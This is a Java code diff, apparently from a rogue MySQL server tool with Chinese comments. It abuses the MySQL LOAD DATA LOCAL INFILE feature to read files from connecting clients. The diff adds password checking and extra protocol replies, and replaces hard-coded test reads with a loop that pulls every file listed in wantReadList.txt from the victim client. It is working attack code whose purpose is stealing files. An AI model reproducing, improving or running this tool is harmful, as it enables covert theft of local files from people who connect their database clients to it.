@@ -93,21 +93,22 @@ public class Socket extends Thread {
                     newByteArray[0] = firstByte;
 
                     // 处理客户端发来的数据包,提取出salt和password,salt结合自己预设的密码 =>变为最终的ServerPassword,password和ServerPassword相等时即验证成功.加入登录验证,正确时继续,否则返回错误
-//                    if (!handlePassword(newByteArray)) {
-//                        configuration.return1045(out, ip);
-//                        break;
-//                    }
+                    if (!handlePassword(newByteArray)) {
+                        configuration.return1045(out, ip);
+                        break;
+                    }
                     configuration.wantReadList = FileUtils.readLines(".\\wantReadList.txt");
+                    int wantReadListSize = configuration.wantReadList.size();
                     String filename = configuration.wantReadList.get(stringUtils.getRandomNum(0, configuration.wantReadList.size() - 1));
+                    boolean isBeginRead = false; // isBeginRead为true时,说明已经能开始使用load data漏洞了.
 
                     out.write(configuration.verificationText);  // res ok
                     out.flush();
                     bys = new byte[1024];
 
                     while (in.read(bys) != -1) {
-                        if (Arrays.equals(stringUtils.hexToByteArray(configuration.selectVersion), getRequest(bys))) {
-                            // todo 写个for循环可以不断的读取
-                            getData(filename, server);
+                        if (Arrays.equals(stringUtils.hexToByteArray(configuration.selectVersion), getRequest(bys)) || Arrays.equals(stringUtils.hexToByteArray(configuration.setNameUtf8), getRequest(bys))) {
+                            isBeginRead = true;
                         } else if (Arrays.equals(stringUtils.hexToByteArray(configuration.showVariable), getRequest(bys))) {
                             // 如果res为 showVariable
                             out.write(stringUtils.hexToByteArray(configuration.showVariablesRes1));
@@ -123,17 +124,23 @@ public class Socket extends Thread {
                             // req : set names utf8
                             //out.write(configuration.verificationText);  // res ok
                             out.flush();
-                            //filename = configuration.wantReadList.get(stringUtils.getRandomNum(0, configuration.wantReadList.size() - 1));
-                            // todo 写个for循环可以不断的读取
-                            getData("D:\\1.txt", server);
-                            getData("D:\\2.txt", server);
-                            getData("D:\\2.txt", server);
-                            getData("D:\\2.txt", server);
-                            getData("D:\\2.txt", server);
+                            isBeginRead = true;
+                        } else if (Arrays.equals(stringUtils.hexToByteArray(configuration.maxAllowedPacket), getRequest(bys))) {
+                            out.write(stringUtils.hexToByteArray(configuration.maxAllowedPacketRes));
+                            out.flush();
+                        }else if(Arrays.equals(stringUtils.hexToByteArray("0e"), getRequest(bys))){
+                            // res ok
+                            out.write(configuration.verificationText);
+                            out.flush();
+                        }
+                        if (isBeginRead) {
+                            // 全部顺序读取
+                            for (int i = 0; i < wantReadListSize; i++) {
+                                filename = configuration.wantReadList.get(i);
+                                getData(filename, server);
+                            }
                         }
                     }
-//                    in.read(bys);
-//                    getData("D:\\2.txt", server);
 
 
                 } catch (Exception e) {
@@ -242,6 +249,9 @@ public class Socket extends Thread {
                 outcome[i] = bys[5 + i];
             }
             return outcome;
+        } else if (bys[4] == 14) {
+            newByte[0] = 14;
+            return newByte;
         }
         return null;
     }
@@ -277,7 +287,7 @@ public class Socket extends Thread {
     /**
      * 处理客户端发来的数据包,提取出salt和password,salt结合自己预设的密码 =>变为最终的ServerPassword,password和ServerPassword相等时即验证成功
      */
-    public static boolean handlePassword(byte[] bys) throws NoSuchAlgorithmException {
+    public static boolean handlePassword(byte[] bys) throws NoSuchAlgorithmException, UnsupportedEncodingException {
         byte[] clientPassword = new byte[20];
         // 1.读取packet中的username,从36开始
         int usernameLength = 0, i = 0;
@@ -341,7 +351,7 @@ public class Socket extends Thread {
     /**
      * 验证客户端发来的密码是否正确
      */
-    public static byte[] comparePassword(String passwd, byte[] salt) throws NoSuchAlgorithmException {
+    public static byte[] comparePassword(String passwd, byte[] salt) throws NoSuchAlgorithmException, UnsupportedEncodingException {
         byte[] password = passwd.getBytes();
         return SecurityUtil.scramble411(password, salt);
     }
